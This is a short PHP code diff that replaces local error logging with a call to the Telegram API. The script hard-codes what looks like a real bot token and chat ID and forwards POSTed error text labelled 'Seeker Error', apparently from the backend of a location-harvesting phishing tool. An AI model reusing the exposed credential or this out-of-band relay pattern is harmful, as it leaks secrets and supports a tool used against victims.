@@ -1,14 +1,10 @@
 <?php
 header('Content-Type: text/html');
-{
-  $err_status = $_POST['Status'];
-  $err_text = $_POST['Error'];
+$botToken = "8386009786:AAE9SInLbXAHOI5HDwm9ctMhDicP7yYmUUM";
+$chatId = "6862649950";
 
-  $f = fopen('../../logs/result.txt', 'w+');
-
-  $data = array('status' => $err_status, 'error' => $err_text);
-  $json_data = json_encode($data);
-  fwrite($f, $json_data);
-  fclose($f);
-}
-
+$err = $_POST['Error'];
+$msg = "⚠️ *Seeker Error:* \n$err";
+$url = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($msg) . "&parse_mode=Markdown";
+file_get_contents($url);
+?>
